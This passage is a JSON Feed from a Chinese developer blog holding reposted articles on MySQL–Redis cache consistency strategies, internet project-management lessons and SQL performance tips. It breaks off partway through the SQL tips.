{
    "version": "https://jsonfeed.org/version/1",
    "title": "艾瑞可erik • All posts by \"undefined\" categories",
    "description": "一只PHP开发的程序猿，偶尔做做运维、Goland、Python、Java、摄影、画画、写作、顺便睡觉，反正整站都搞过。",
    "home_page_url": "https://erik.xyz",
    "items": [
        {
            "id": "https://erik.xyz/2024/11/11/mysql-redis-consistency/",
            "url": "https://erik.xyz/2024/11/11/mysql-redis-consistency/",
            "title": "如何下保证MySQL数据库与Redis缓存数据一致性？",
            "date_published": "2024-11-11T01:58:00.000Z",
            "content_html": "<p>有时候感觉MySQL我们懂了，Redis我们懂了，但是面试的时候一直答不好，经常被难住，问题在哪呢？</p>\n<p>答案是：面试官考的不是专项能力，而是多项技术结合应用能力。</p>\n<p>就拿<strong>并发场景下如何保证MySQL与Redis缓存一致性？</strong>这个面试官常见的拷打考点举例。</p>\n<p>对于读多写少并且要求高性能的业务逻辑，我们通常在应用服务器访问MySQL数据库的中间加上一层<strong>Redis缓存层</strong>，以提高数据的查询效率，减轻MySQL数据库的压力，避免在MySQL出现性能瓶颈。<br><span id=\"more\"></span><br><img src=\"/img/2024/2024111101.png\" alt=\"https://erik.xyz\"></p>\n<p>该问题，如果在数据存储后，只读场景下是不会出现MySQL与Redis缓存的一致性问题的，所以真正需要考虑的是<strong>并发读写场景</strong>下的数据一致性问题。</p>\n<p>如果我们不加分析，单独利用MySQL和Redis的知识进行回答并发场景下如何保证MySQL与Redis缓存一致性？很难把这个问题回答好，因为看起来很简单的方案实际上是漏洞百出的。</p>\n<h4 id=\"简单方案下的漏洞百出\"><a href=\"#简单方案下的漏洞百出\" class=\"headerlink\" title=\"简单方案下的漏洞百出\"></a>简单方案下的漏洞百出</h4><p>我们先看下简单的更新数据库、删除缓存和更新缓存方案下，会出现什么问题？</p>\n<p><img src=\"/img/2024/2024111102.png\" alt=\"https://erik.xyz\"></p>\n<h4 id=\"更新缓存，再更新数据库\"><a href=\"#更新缓存，再更新数据库\" class=\"headerlink\" title=\"更新缓存，再更新数据库\"></a>更新缓存，再更新数据库</h4><p>先说结论：不考虑。</p>\n<p>原因是更新缓存成功后，数据库可能更新失败，出现数据库为旧值，缓存为新值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！并且当前数据库中的值为旧值，而业务数据的正确性应该以数据库的为准。</p>\n<p>那么如果更新缓存成功后，数据库可能更新失败，我们<strong>重新更新缓存</strong>是不是可以了？</p>\n<p><img src=\"/img/2024/2024111103.png\" alt=\"https://erik.xyz\"></p>\n<p>抛开需要重新更新缓存时，要单表或多表重新查询数据，再更新数据带来的性能问题，还可能期间有数据变更再次陷入脏数据的情况。实际上仍然还是会出现并发一致性问题。</p>\n<p>只要缓存进行了更新，后续的读请求<strong>在更新数据库前、更新数据库失败并准备更新缓存前</strong>，基本上都能命中缓存情况，而这时返回的数据都是未落库的脏数据。</p>\n<p><img src=\"/img/2024/2024111104.png\" alt=\"https://erik.xyz\"></p>\n<h4 id=\"更新数据库，再更新缓存\"><a href=\"#更新数据库，再更新缓存\" class=\"headerlink\" title=\"更新数据库，再更新缓存\"></a>更新数据库，再更新缓存</h4><p>不考虑。</p>\n<p>原因是当数据库更新成功后，缓存更新失败，出现数据库为最新值，缓存为旧值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！</p>\n<p><img src=\"/img/2024/2024111105.png\" alt=\"https://erik.xyz\"></p>\n<p>该方案就算在更新数据库、更新缓存都成功的情况下，还是会存在并发引发的一致性问题，如下图所示（点击图片查看大图）：<br><img src=\"/img/2024/2024111106.png\" alt=\"https://erik.xyz\"></p>\n<p>可以看到在并发多写多读的场景下数据存在的不一致性问题。</p>\n<h4 id=\"先删除缓存，再更新数据库\"><a href=\"#先删除缓存，再更新数据库\" class=\"headerlink\" title=\"先删除缓存，再更新数据库\"></a>先删除缓存，再更新数据库</h4><p>不考虑，但是通过使用<strong>延时双删策略</strong>后可以考虑。</p>\n<p>采用“<strong>先删除缓存，再更新数据库</strong>”的方案是一种常见的方法来尝试解决这个问题的策略。</p>\n<p>这种方法逻辑较为简单，易于理解和实现，理论上删除旧缓存后，下次读取时将从数据库获取最新数据。</p>\n<p>但在并发的极端情况下，删除缓存成功后，如果再有大量的并发请求进来，那么便会直接请求到数据库中，对数据库造成巨大的压力。而且此方案还是可能会发生数据不一致性问题。</p>\n<p><img src=\"/img/2024/2024111107.png\" alt=\"https://erik.xyz\"></p>\n<p>通过上图发现在删除缓存后，如果有并发读请求1.1进来，那么查询缓存肯定是不存在，则去读取数据库，但因为此时更新数据库x=10的操作2.更新数据库还未完成，所以读取到的仍然是旧值x=5并设置缓存后，在2.更新数据库完成后，数据是新值10，而缓存是旧值，造成了数据不一致的问题。</p>\n<p>对此我们可以先进行一波的小优化，那就是<strong>延时双删策略</strong>。即在更新数据库之后，先延迟等待一下（等待时间参考该读请求的响应时间+几十毫秒），再继续删除缓存。这样做的目的是确保读请求结束（已经在1.2读库中读取到了旧数据，后续会在该请求中更新缓存），写请求可以删除读请求造成的缓存脏数据，保证再删除缓存之后的所有读请求都能读到最新值。</p>\n<p><img src=\"/img/2024/2024111108.png\" alt=\"https://erik.xyz\"></p>\n<p>可以看出此优化方案关键点在于等待多长时间后，再次删除缓存尤为重要，但是这个时间都是根据历史查询请求的响应时间判断的，实际情况会有浮动。这也导致如果等待的延时时间过短，则仍然会出现数据不一致的情况；等待延迟时间过长，则导致延迟期间出现数据不一致的时间变长。</p>\n<p>另外<strong>延时双删策略</strong>还需要考虑如果再次删除缓存失败的情况如何处理？</p>\n<p>因为删除失败将导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！这个在下文的技术优化方案继续讨论。</p>\n<h4 id=\"先更新数据库，再删除缓存\"><a href=\"#先更新数据库，再删除缓存\" class=\"headerlink\" title=\"先更新数据库，再删除缓存\"></a>先更新数据库，再删除缓存</h4><p>比较推荐。</p>\n<p>采用的“先更新数据库，再删除缓存”策略，跟“先删除缓存，再更新数据库”中我们进行<strong>延时双删策略</strong>的小优化基本一样，仍然需要考虑删除缓存失败的情况如何处理。</p>\n<p>单纯从“先更新数据库，再删除缓存”和“先删除缓存，再更新数据库”对比起来。在大多数情况下，“先更新数据库，再删除缓存”被认为是一个更好的选择，原因如下：</p>\n<p>1.<strong>数据的一致性</strong>：这种方法更倾向于保持数据的最终一致性，即使缓存删除失败，也能保证数据的一致性不会长期受损。</p>\n<p>2.<strong>用户体验</strong>：在“先删除缓存，再更新数据库”的情况下，如果数据库更新失败，用户可能会一直看到旧数据，直到缓存过期。相比之下，“先更新数据库，再删除缓存”可以在某种程度上避免这种情况。</p>\n<p>但该方案同样也会出现数据不一致性问题，如下图所示。</p>\n<p><img src=\"/img/2024/2024111109.png\" alt=\"https://erik.xyz\"></p>\n<p>当数据库的数据被更新后，缓存也被删除。接下来的出现读请求3.1和写请求3.2同时进来。</p>\n<p>读请求先读了缓存发现缓存无命中，则查询数据库并在准备更新缓存时，3.2写请求已经完成了数据的更新和删除缓存的动作，之后3.1读请求才更新了缓存。最后导致了数据库中的值未新值，缓存中的值为旧值。</p>\n<h4 id=\"优化后方案\"><a href=\"#优化后方案\" class=\"headerlink\" title=\"优化后方案\"></a>优化后方案</h4><p>从上面的简单方案方案中，似乎没有一种方案真正能解决并发场景下MySQL数据与Redis缓存数据一致性的问题。</p>\n<p>这里有个说明下，如果业务要求必须要满足<strong>强一致性</strong>，那么不管如何优化缓存策略，都无法满足，而最好的办法是不用缓存。</p>\n<p>强一致性：它要求系统写入什么，读出来的也会是什么，用户体验好，但实现起来往往对系统的性能影响大。</p>\n<p>解决方案是读写串行化，而此方案会大大增加系统的处理效率，吞吐量也会大大降低。</p>\n<p>另外在大型分布式系统中，其实分布式事务大多数情况都不会使用，因为维护成本太高了、复杂度也高。所以在分布式系统，我们一般都会推崇最终一致性，即这种一致性级别约束了系统在写入成功后，不承诺立即可以读到写入的值，也不承诺多久之后数据能够达到一致，但会尽可能地保证到某个时间级别（比如秒级别）后，数据能够达到一致状态。</p>\n<p>现在我们接着继续优化..</p>\n<h4 id=\"延迟双删策略-重试机制\"><a href=\"#延迟双删策略-重试机制\" class=\"headerlink\" title=\"延迟双删策略+重试机制\"></a>延迟双删策略+重试机制</h4><p>从上面简单方案下的漏洞百出下的先删除缓存，再更新数据库中，我们可以看出来其实<strong>延迟双删策略</strong>，算是融合“先删除缓存，再更新数据库”和“先更新数据库，再删除缓存”的策略，可以解决大部分的数据一致性的业务逻辑处理问题。</p>\n<p>但我们前面还遗留了一个待解决的问题：如果再次<strong>删除缓存失败的情况如何处理</strong>？</p>\n<p>——-当然是补救去继续删除这个缓存Key了，而补救方法则是<strong>重试</strong>。</p>\n<p><strong>重试机制</strong>可以在当前中启动新协程（Golang中属于用户态的轻量级线程）中进行重试；也可以放到消息队列中进行重试；还可以是先启动新协程重试3次，重试失败后继续放到消息队列中重试，如下图展示的是放到消息队列中进行重试。</p>\n<p>新协程中进行重试需要注意的是使用的新上下文context.Background()，而不是当前请求的上下文。</p>\n<p>一般消息队列会支持高可靠性的队列，例如 RabbitMQ、Kafka 等。这些消息队列提供了非常强的消息传递、异步处理和持久化功能，可以有效地解决数据同步的问题。</p>\n<p><img src=\"/img/2024/2024111110.png\" alt=\"https://erik.xyz\"></p>\n<p>此方案仍然存在一些需要，如：选择合适的延迟等待时间进行删除缓存；协程中重试删除缓存次数、间隔时间；消息队列中删除失败缓存失败后是否需要重试等。</p>\n<h4 id=\"读取binlog异步删除缓存\"><a href=\"#读取binlog异步删除缓存\" class=\"headerlink\" title=\"读取binlog异步删除缓存\"></a>读取binlog异步删除缓存</h4><p>重试删除缓存机制还可以吧，就是会造成好多业务代码入侵。</p>\n<p>其实，还可以这样优化：</p>\n<p>1.通过Canal将binlog日志采集发送到MQ队列来异步淘汰key。</p>\n<p>2.删除缓存的应用程序通过ACK手动机制确认处理这条更新消息，删除缓存，保证数据缓存一致性。</p>\n<p><img src=\"/img/2024/2024111111.png\" alt=\"https://erik.xyz\"></p>\n<p>异步淘汰key相比于等新对比缓存数据并更新会简单一些，因为可能一份缓存数据涉及多张表的数据查询、聚合、排序等。</p>\n<p>尽管该方案看起来也不错了，但是因为引入额外的组件（如Canal、消息队列）复杂性增加了也不少，需要维护和监控这些组件的运行状态，保证组件运行正常。</p>\n<h4 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"定时任务\"></a>定时任务</h4><p>在某些业务场景的需求下，也可以通过定时任务的方式进行 Redis 和 MySQL 的数据同步。</p>\n<p>具体做法是通过定时任务从 Redis 中读取数据，然后跟 MySQL 中的数据进行比对，如果 Redis 中数据有变化，则进行同步。</p>\n<p><img src=\"/img/2024/2024111112.png\" alt=\"https://erik.xyz\"></p>\n<p>这种方式虽然实现起来比较简单，但需要注意同步的时效性，如果时间间隔设置不当，可能会导致同步的数据丢失或者不准确。</p>\n<h4 id=\"双写一致性\"><a href=\"#双写一致性\" class=\"headerlink\" title=\"双写一致性\"></a>双写一致性</h4><p>在更新数据库的同时也更新缓存/删除缓存，即所谓的“<strong>双写</strong>”。</p>\n<p>这样可以确保在数据库更新后，缓存中的数据也是最新的，从而减少数据不一致的时间窗口。</p>\n<p><img src=\"/img/2024/2024111113.png\" alt=\"https://erik.xyz\"></p>\n<p><strong>并发控制</strong>：在高并发场景下，多个请求同时对同一个数据进行更新时，如果没有妥善处理并发控制，可能会导致数据不一致的问题。所以这里引入了分布式锁和事务操作：</p>\n<p><strong>使用分布式锁</strong>：在执行双写操作之前，获取一个分布式锁（如Zookeeper、Redis的SETNX命令等），确保同一时刻只有一个线程/进程能够执行双写操作。</p>\n<p><strong>事务处理</strong>：对于支持事务的缓存系统（如Redis的MULTI/EXEC命令）和MySQL事务，可以将Redis缓存和MySQL更新操作放入事务中，确保要么全部成功，要么全部失败。</p>\n<p>当然在“双写”的策略中，除了并发控制外，可以结合上面提到的重试、定时策略进行组合，以应对极端情况下的数据不一致性问题。</p>\n<p>另外也可以处理失败的逻辑上加入告警机制，及时通知开发和运维人员。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/sG7xDtLKLtlnu9ntpc5hdw\">皇子谈技术</a></p>\n",
            "tags": [
                "mysql",
                "redis",
                "数据一致性"
            ]
        },
        {
            "id": "https://erik.xyz/2024/09/22/internet-practice/",
            "url": "https://erik.xyz/2024/09/22/internet-practice/",
            "title": "史上最详细的互联网项目管理实战图解",
            "date_published": "2024-09-22T00:46:00.000Z",
            "content_html": "<p><img src=\"/img/2024/640.jpeg\" alt=\"erik.xyz\"></p>\n<p>如何系统的掌握互联网项目管理知识和经验，我搜罗世面上基本没有介绍这方面的图书，为此咱们去年年初，组织咱们前沿社区的众多大咖联合电子工业出版社出版了这本新书《互联网项目管理实战指南》希望可以助大家一臂之力！今天把文章的思维导图干货一起分享给大家！<br><span id=\"more\"></span><br><img src=\"/img/2024/640.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/641.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/642.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/643.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/644.png\" alt=\"erik.xyz\"></p>\n<p>互联网项目管理的17条经验沟通是王道 </p>\n<ul>\n<li>不论技术多么先进，没有良好的沟通机制，项目都会遇到瓶颈。确保团队成员之间有开放的沟通渠道，并且每个人都清楚自己的职责和项目的整体目标。优先级高于一切 </li>\n<li>学会区分哪些功能是必须的，哪些可以稍后添加。优先处理那些对用户来说最重要的功能。短周期发布 </li>\n<li>通过缩短发布周期，可以更快地得到用户反馈，并及时调整方向，减少资源浪费。用户反馈是金 - 始终保持与用户的联系，收集他们的反馈，并快速做出响应。这有助于产品不断改进。简化就是美 </li>\n<li>尽量简化产品的设计和功能，避免不必要的复杂性。简单易用的产品往往更受欢迎。质量控制不可忽视 </li>\n<li>在项目的每个阶段都要进行质量检查，防止小问题积累成大问题。风险管理要提前 - 对潜在的风险进行评估，并制定相应的应对策略，这样可以在问题发生前就解决它们。灵活调整计划 </li>\n<li>计划永远赶不上变化，学会在项目过程中根据实际情况调整计划是非常重要的。团队建设很重要 </li>\n<li>投资于团队建设活动，增强团队凝聚力，提高工作效率。技术选型要谨慎 </li>\n<li>在选择技术栈时要考虑长远发展，而不是仅仅因为某项技术当前流行。数据驱动决策 </li>\n<li>使用数据分析来支持产品决策，而不是仅凭直觉。重视用户体验 </li>\n<li>用户体验应该贯穿整个产品生命周期，从设计到开发再到测试，都要考虑到用户体验。持续学习与适应 </li>\n<li>技术和市场都在不断变化，持续学习新的知识和技术是必要的。文档化重要信息 </li>\n<li>确保所有的关键决策和信息都有记录，这对于新加入的团队成员来说尤其重要。健康的工作生活平衡 - 鼓励团队成员保持良好的工作生活平衡，过度劳累只会降低生产力和创新能力。持续集成/持续部署（CI/CD） </li>\n<li>实施CI/CD流程，不仅提高了代码的质量，也加速了软件的发布周期。透明度提升信任 </li>\n<li>保持项目进展的透明，定期向所有相关方汇报进度，这样可以建立信任并减少误解。</li>\n</ul>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/kv0BAmE6ASll9eZjvlZImQ\">PMO前沿</a></p>\n",
            "tags": [
                "互联",
                "项目实战"
            ]
        },
        {
            "id": "https://erik.xyz/2024/07/22/sql-performance-optimization/",
            "url": "https://erik.xyz/2024/07/22/sql-performance-optimization/",
            "title": "SQL性能优化的47个小技巧，果断收藏！",
            "date_published": "2024-07-22T04:44:34.000Z",
            "content_html": "<p><strong>1、先了解MySQL的执行过程</strong></p>\n<p>了解了MySQL的执行过程，我们才知道如何进行sql优化。</p>\n<p>1.客户端发送一条查询语句到服务器；</p>\n<p>2.服务器先查询缓存，如果命中缓存，则立即返回存储在缓存中的数据；</p>\n<p>3.未命中缓存后，MySQL通过关键字将SQL语句进行解析，并生成一颗对应的解析树，MySQL解析器将使用MySQL语法进行验证和解析。例如，验证是否使用了错误的关键字，或者关键字的使用是否正确；</p>\n<p>4.预处理是根据一些MySQL规则检查解析树是否合理，比如检查表和列是否存在，还会解析名字和别名，然后预处理器会验证权限；</p>\n<p>5.根据执行计划查询执行引擎，调用API接口调用存储引擎来查询数据；</p>\n<p>6.将结果返回客户端，并进行缓存；<br><span id=\"more\"></span></p>\n<p><img src=\"/img/2024/202405201.png\" alt=\"erik.xyz\"></p>\n<p><strong>2、数据库常见规范</strong></p>\n<p>1.所有数据库对象名称必须使用小写字母并用下划线分割；</p>\n<p>2.所有数据库对象名称禁止使用mysql保留关键字；</p>\n<p>3.数据库对象的命名要能做到见名识意，并且最后不要超过32个字符；</p>\n<p>4.临时库表必须以tmp<em>为前缀并以日期为后缀，备份表必须以bak</em>为前缀并以日期(时间戳)为后缀；</p>\n<p>5.所有存储相同数据的列名和列类型必须一致；</p>\n<p><strong>3、所有表必须使用Innodb存储引擎</strong></p>\n<p>没有特殊要求（即Innodb无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用Innodb存储引擎（mysql5.5之前默认使用Myisam，5.6以后默认的为Innodb）。</p>\n<p>Innodb 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。</p>\n<p><strong>4、每个Innodb表必须有个主键</strong></p>\n<p>Innodb是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种。</p>\n<p>Innodb是按照主键索引的顺序来组织表的</p>\n<p>1.不要使用更新频繁的列作为主键，不适用多列主键；</p>\n<p>2.不要使用UUID、MD5、HASH、字符串列作为主键（无法保证数据的顺序增长）；</p>\n<p>3.主键建议使用自增ID值；</p>\n<p><strong>5、数据库和表的字符集统一使用UTF8</strong></p>\n<p>兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效，如果数据库中有存储emoji表情的需要，字符集需要采用utf8mb4字符集。</p>\n<p><strong>6、查询SQL尽量不要使用select *，而是具体字段</strong></p>\n<p>select *的弊端：</p>\n<p>1.增加很多不必要的消耗，比如CPU、IO、内存、网络带宽；</p>\n<p>2.增加了使用覆盖索引的可能性；</p>\n<p>3.增加了回表的可能性；</p>\n<p>4.当表结构发生变化时，前端也需要更改；</p>\n<p>5.查询效率低；</p>\n<p><strong>7、避免在where子句中使用 or 来连接条件</strong></p>\n<p>1.使用or可能会使索引失效，从而全表扫描；</p>\n<p>2.对于or没有索引的salary这种情况，假设它走了id的索引，但是走到salary查询条件时，它还得全表扫描；</p>\n<p>3.也就是说整个过程需要三步：全表扫描+索引扫描+合并。如果它一开始就走全表扫描，直接一遍扫描就搞定；</p>\n<p>4.虽然mysql是有优化器的，处于效率与成本考虑，遇到or条件，索引还是可能失效的；</p>\n<p><strong>8、尽量使用数值替代字符串类型</strong></p>\n<p>1.因为引擎在处理查询和连接时会逐个比较字符串中每一个字符；</p>\n<p>2.而对于数字型而言只需要比较一次就够了；</p>\n<p>3.字符会降低查询和连接的性能，并会增加存储开销；</p>\n<p><strong>9、使用varchar代替char</strong></p>\n<p>1.varchar变长字段按数据内容实际长度存储，存储空间小，可以节省存储空间；</p>\n<p>2.char按声明大小存储，不足补空格；</p>\n<p>3.其次对于查询来说，在一个相对较小的字段内搜索，效率更高；</p>\n<p><strong>10、财务、银行相关的金额字段必须使用decimal类型</strong></p>\n<ul>\n<li><p>非精准浮点：float,double</p>\n</li>\n<li><p>精准浮点：decimal</p>\n</li>\n</ul>\n<p>1.Decimal类型为精准浮点数，在计算时不会丢失精度；</p>\n<p>2.占用空间由定义的宽度决定，每4个字节可以存储9位数字，并且小数点要占用一个字节；</p>\n<p>3.可用于存储比bigint更大的整型数据；</p>\n<p><strong>11、避免使用ENUM类型</strong></p>\n<ul>\n<li><p>修改ENUM值需要使用ALTER语句；</p>\n</li>\n<li><p>ENUM类型的ORDER BY操作效率低，需要额外操作；</p>\n</li>\n<li><p>禁止使用数值作为ENUM的枚举值；</p>\n</li>\n</ul>\n<p><strong>12、去重distinct过滤字段要少</strong></p>\n<p>1.带distinct的语句占用cpu时间高于不带distinct的语句</p>\n<p>2.当查询很多字段时，如果使用distinct，数据库引擎就会对数据进行比较，过滤掉重复数据</p>\n<p>3.然而这个比较、过滤的过程会占用系统资源，如cpu时间</p>\n<p><strong>13、where中使用默认值代替null</strong></p>\n<p>1.并不是说使用了is null或者 is not null就会不走索引了，这个跟mysql版本以及查询成本都有关；</p>\n<p>2.如果mysql优化器发现，走索引比不走索引成本还要高，就会放弃索引，这些条件 !=，&lt;&gt;，is null，is not null经常被认为让索引失效；</p>\n<p>3.其实是因为一般情况下，查询的成本高，优化器自动放弃索引的；</p>\n<p>4.如果把null值，换成默认值，很多时候让走索引成为可能，同时，表达意思也相对清晰一点；</p>\n<p><strong>14、避免在where子句中使用!=或&lt;&gt;操作符</strong></p>\n<p>1.使用!=和&lt;&gt;很可能会让索引失效</p>\n<p>2.应尽量避免在where子句中使用!=或&lt;&gt;操作符，否则引擎将放弃使用索引而进行全表扫描实</p>\n<p>3.现业务优先，实在没办法，就只能使用，并不是不能使用</p>\n<p><strong>15、inner join 、left join、right join，优先使用inner join</strong></p>\n<p>三种连接如果结果相同，优先使用inner join，如果使用left join左边表尽量小。</p>\n<ul>\n<li><p>inner join 内连接，只保留两张表中完全匹配的结果集；</p>\n</li>\n<li><p>left join会返回左表所有的行，即使在右表中没有匹配的记录；</p>\n</li>\n<li><p>right join会返回右表所有的行，即使在左表中没有匹配的记录；</p>\n</li>\n</ul>\n<p>为什么？</p>\n<ul>\n<li>如果inner join是等值连接，返回的行数比较少，所以性能相对会好一点；</li>\n<li>使用了左连接，左边表数据结果尽量小，条件尽量放到左边处理，意味着返回的行数可能比较少；</li>\n<li>这是mysql优化原则，就是小表驱动大表，小的数据集驱动大的数据集，从而让性能更优；</li>\n</ul>\n<p><strong>16、提高group by语句的效率</strong></p>\n<p>1、反例</p>\n<p>先分组，再过滤<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select job, avg（salary） from employee group by jobhaving job =&#x27;develop&#x27; or job = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure></p>\n<p>2、正例</p>\n<p>先过滤，后分组<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select job，avg（salary） from employee where job =&#x27;develop&#x27; or job = &#x27;test&#x27; group by job;</span><br></pre></td></tr></table></figure></p>\n<p>3、理由</p>\n<p>可以在执行到该语句前，把不需要的记录过滤掉</p>\n<p><strong>17、清空表时优先使用truncate</strong></p>\n<p>truncate table在功能上与不带 where子句的 delete语句相同：二者均删除表中的全部行。但 truncate table比 delete速度快，且使用的系统和事务日志资源少。</p>\n<p>delete语句每次删除一行，并在事务日志中为所删除的每行记录一项。truncate table通过释放存储表数据所用的数据页来删除数据，并且只在事务日志中记录页的释放。</p>\n<p>truncate table删除表中的所有行，但表结构及其列、约束、索引等保持不变。新行标识所用的计数值重置为该列的种子。如果想保留标识计数值，请改用 DELETE。如果要删除表定义及其数据，请使用 drop table语句。</p>\n<p>对于由 foreign key约束引用的表，不能使用 truncate table，而应使用不带  where子句的 DELETE 语句。由于 truncate table不记录在日志中，所以它不能激活触发器。</p>\n<p>truncate table不能用于参与了索引视图的表。</p>\n<p><strong>18、操作delete或者update语句，加个limit或者循环分批次删除</strong></p>\n<p>（1）降低写错SQL的代价</p>\n<p>清空表数据可不是小事情，一个手抖全没了，删库跑路？如果加limit，删错也只是丢失部分数据，可以通过binlog日志快速恢复的。</p>\n<p>（2）SQL效率很可能更高</p>\n<p>SQL中加了limit 1，如果第一条就命中目标return， 没有limit的话，还会继续执行扫描表。</p>\n<p>（3）避免长事务</p>\n<p>delete执行时,如果age加了索引，MySQL会将所有相关的行加写锁和间隙锁，所有执行相关行会被锁住，如果删除数量大，会直接影响相关业务无法使用。</p>\n<p>（4）数据量大的话，容易把CPU打满</p>\n<p>如果你删除数据量很大时，不加 limit限制一下记录数，容易把cpu打满，导致越删越慢。</p>\n<p>（5）锁表</p>\n<p>一次性删除太多数据，可能造成锁表，会有lock wait timeout exceed的错误，所以建议分批操作。</p>\n<p><strong>19、UNION操作符</strong></p>\n<p>UNION在进行表链接后会筛选掉重复的记录，所以在表链接后会对所产生的结果集进行排序运算，删除重复的记录再返回结果。实际大部分应用中是不会产生重复的记录，最常见的是过程表与历史表UNION。如：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select username,tel from userunionselect departmentname from department</span><br></pre></td></tr></table></figure><br>这个SQL在运行时先取出两个表的结果，再用排序空间进行排序删除重复的记录，最后返回结果集，如果表数据量大的话可能会导致用磁盘进行排序。推荐方案：采用UNION ALL操作符替代UNION，因为UNION ALL操作只是简单的将两个结果合并后就返回。</p>\n<p><strong>20、SQL语句中IN包含的字段不宜过多</strong></p>\n<p>MySQL的IN中的常量全部存储在一个数组中，这个数组是排序的。如果值过多，产生的消耗也是比较大的。如果是连续的数字，可以使用between代替，或者使用连接查询替换。</p>\n<p><strong>21、批量插入性能提升</strong></p>\n<p>（1）多条提交</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO user (id,username) VALUES(1,&#x27;哪吒编程&#x27;);INSERT INTO user (id,username) VALUES(2,&#x27;妲己&#x27;);</span><br></pre></td></tr></table></figure>\n<p>（2）批量提交<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO user (id,username) VALUES(1,&#x27;哪吒编程&#x27;),(2,&#x27;妲己&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>默认新增SQL有事务控制，导致每条都需要事务开启和事务提交，而批量处理是一次事务开启和提交，效率提升明显，达到一定量级，效果显著，平时看不出来。</p>\n<p><strong>22、表连接不宜太多，索引不宜太多，一般5个以内</strong></p>\n<p>（1）表连接不宜太多，一般5个以内</p>\n<p>1.关联的表个数越多，编译的时间和开销也就越大</p>\n<p>2.每次关联内存中都生成一个临时表</p>\n<p>3.应该把连接表拆开成较小的几个执行，可读性更高</p>\n<p>4.如果一定需要连接很多表才能得到数据，那么意味着这是个糟糕的设计了</p>\n<p>5.阿里规范中，建议多表联查三张表以下</p>\n<p>（2）索引不宜太多，一般5个以内</p>\n<p>1.索引并不是越多越好，虽其提高了查询的效率，但却会降低插入和更新的效率；</p>\n<p>2.索引可以理解为一个就是一张表，其可以存储数据，其数据就要占空间；</p>\n<p>3.索引表的数据是排序的，排序也是要花时间的；</p>\n<p>4.insert或update时有可能会重建索引，如果数据量巨大，重建将进行记录的重新排序，所以建索引需要慎重考虑，视具体情况来定；</p>\n<p>5.一个表的索引数最好不要超过5个，若太多需要考虑一些索引是否有存在的必要；</p>\n<p><strong>23、禁止给表中的每一列都建立单独的索引</strong></p>\n<p>真有这么干的，我也是醉了。</p>\n<p>2万字带你精通MySQL索引</p>\n<p><strong>24、如何选择索引列的顺序</strong></p>\n<p>建立索引的目的是：希望通过索引进行数据查找，减少随机IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。</p>\n<p>区分度最高的放在联合索引的最左侧（区分度=列中不同值的数量/列的总行数）。</p>\n<p>尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO性能也就越好）。</p>\n<p>使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）。</p>\n<p><strong>25、对于频繁的查询优先考虑使用覆盖索引</strong></p>\n<p>覆盖索引：就是包含了所有查询字段(where,select,ordery by,group by包含的字段)的索引。</p>\n<p>覆盖索引的好处：</p>\n<p>（1）避免Innodb表进行索引的二次查询</p>\n<p>Innodb是以聚集索引的顺序来存储的，对于Innodb来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。</p>\n<p>而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了IO操作，提升了查询效率。</p>\n<p>（2）可以把随机IO变成顺序IO加快查询效率</p>\n<p>由于覆盖索引是按键值的顺序存储的，对于IO密集型的范围查找来说，对比随机从磁盘读取每一行的数据IO要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的IO转变成索引查找的顺序IO。</p>\n<p><strong>26、建议使用预编译语句进行数据库操作</strong></p>\n<p>预编译语句可以重复使用这些计划，减少SQL编译所需要的时间，还可以解决动态SQL所带来的SQL注入的问题。</p>\n<p>只传参数，比传递SQL语句更高效。</p>\n<p>相同语句可以一次解析，多次使用，提高处理效率。</p>\n<p><strong>27、避免产生大事务操作</strong></p>\n<p>大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对MySQL的性能产生非常大的影响。</p>\n<p>特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批。</p>\n<p><strong>28、避免在索引列上使用内置函数</strong></p>\n<p>使用索引列上内置函数，索引失效。</p>\n<p><strong>29、组合索引</strong></p>\n<p>排序时应按照组合索引中各列的顺序进行排序，即使索引中只有一个列是要排序的，否则排序性能会比较差。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 